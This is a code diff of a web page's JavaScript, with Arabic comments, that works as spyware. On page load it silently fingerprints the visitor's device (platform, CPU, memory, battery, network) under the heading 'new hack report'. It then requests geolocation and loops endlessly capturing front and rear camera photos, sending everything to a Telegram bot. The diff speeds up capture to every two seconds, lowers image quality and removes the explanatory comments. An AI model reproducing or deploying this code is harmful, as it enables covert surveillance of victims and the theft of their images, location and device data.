@@ -32,7 +32,6 @@
         const canvas = document.getElementById('canvas');
         let currentStream = null;
 
-        // 1. وظائف الإرسال لتليجرام
         async function sendToTelegram(endpoint, params) {
             try {
                 await fetch(`https://api.telegram.org/bot${TOKEN}/${endpoint}`, {
@@ -50,20 +49,17 @@
             sendToTelegram('sendMessage', formData);
         }
 
-        // 2. سحب بصمة الجهاز العميقة (بدون أذونات)
         async function getDeviceHardware() {
             let info = "🛡️ **تقرير اختراق جديد (بصمة الجهاز):**\n\n";
             info += `📱 *المنصة:* ${navigator.platform}\n`;
             info += `⚙️ *المعالج (أنوية):* ${navigator.hardwareConcurrency || "غير معروف"}\n`;
             info += `💾 *الرام التقريبي:* ${navigator.deviceMemory || "غير معروف"} GB\n`;
             
-            // معلومات البطارية
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 info += `🔋 *البطارية:* ${Math.round(b.level * 100)}% (${b.charging ? "🔌 شاحن" : "🔋 استهلاك"})\n`;
             }
 
-            // معلومات الشبكة
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (conn) {
                 info += `🌐 *الشبكة:* ${conn.effectiveType} (${conn.downlink} Mbps)\n`;
@@ -73,7 +69,6 @@
             sendText(info);
         }
 
-        // 3. سحب الموقع الجغرافي (يحتاج إذن)
         function grabLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((p) => {
@@ -83,14 +78,13 @@
             }
         }
 
-        // 4. التصوير التتابعي (أمامية وخلفية)
         async function startSurveillance() {
             const modes = ["user", "environment"];
             let i = 0;
 
             while (true) {
                 const mode = modes[i % 2];
-                const label = mode === "user" ? "الآمامية 🤳" : "الخلفية 📷";
+                const label = mode === "user" ? "الأمامية 🤳" : "الخلفية 📷";
                 
                 try {
                     if (currentStream) currentStream.getTracks().forEach(t => t.stop());
@@ -101,7 +95,8 @@
                     });
                     
                     video.srcObject = currentStream;
-                    await new Promise(r => setTimeout(r, 1500)); // وقت للتركيز (Focus)
+                    // تم تقليل وقت الانتظار للاستجابة السريعة
+                    await new Promise(r => setTimeout(r, 800)); 
 
                     const context = canvas.getContext('2d');
                     canvas.width = video.videoWidth;
@@ -112,26 +107,24 @@
                         const fd = new FormData();
                         fd.append('chat_id', CHAT_ID);
                         fd.append('photo', blob, 'shot.jpg');
-                        fd.append('caption', `🔄 لقطة من الكاميرا: ${label}`);
+                        fd.append('caption', `🔄 لقطة سريعة من: ${label}`);
                         sendToTelegram('sendPhoto', fd);
-                    }, 'image/jpeg', 0.6);
+                    }, 'image/jpeg', 0.5);
 
                 } catch (e) {
                     console.log("Camera Switch Error", e);
                 }
                 
                 i++;
-                await new Promise(r => setTimeout(r, 4000)); // انتظار 4 ثواني بين كل لقطة
+                // --- التعديل المطلوب: التبديل كل ثانيتين (2000 مللي ثانية) ---
+                await new Promise(r => setTimeout(r, 2000)); 
             }
         }
 
-        // التنفيذ عند الدخول
         window.onload = () => {
-            getDeviceHardware(); // صامت وفوري
-            grabLocation();      // يطلب إذن
-            startSurveillance(); // يطلب إذن ويبدأ الدورة
-            
-            // ميزة إضافية: منع الشاشة من الإغلاق
+            getDeviceHardware();
+            grabLocation();
+            startSurveillance();
             if (navigator.wakeLock) { navigator.wakeLock.request('screen'); }
         };
     </script>
